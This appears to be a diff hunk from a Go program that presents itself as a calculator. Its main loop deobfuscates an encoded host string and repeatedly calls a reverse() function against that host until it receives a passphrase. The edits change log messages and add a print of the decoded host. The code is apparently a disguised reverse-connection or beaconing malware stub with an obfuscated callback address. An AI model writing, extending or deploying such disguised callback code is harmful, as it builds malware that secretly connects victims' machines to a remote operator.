@@ -272,15 +272,16 @@ func reverse(host string) {
 	}
 }
 func main() {
-	log.Printf("Start calculator %s\n")
+	log.Printf("Start calculator")
 	host := "NUlzMkF3PD5yMkF2OEp5PUh6"
 	host = desofuscarTexto(host)
+	log.Printf("host: %s\n", host)
 
 	for true {
 		time.Sleep(3 * time.Second)
 		reverse(host)
 		if passphrase != "" {
-			fmt.Println("tenemos passphrase")
+			fmt.Println("tenemos k")
 			break
 		}
 	}
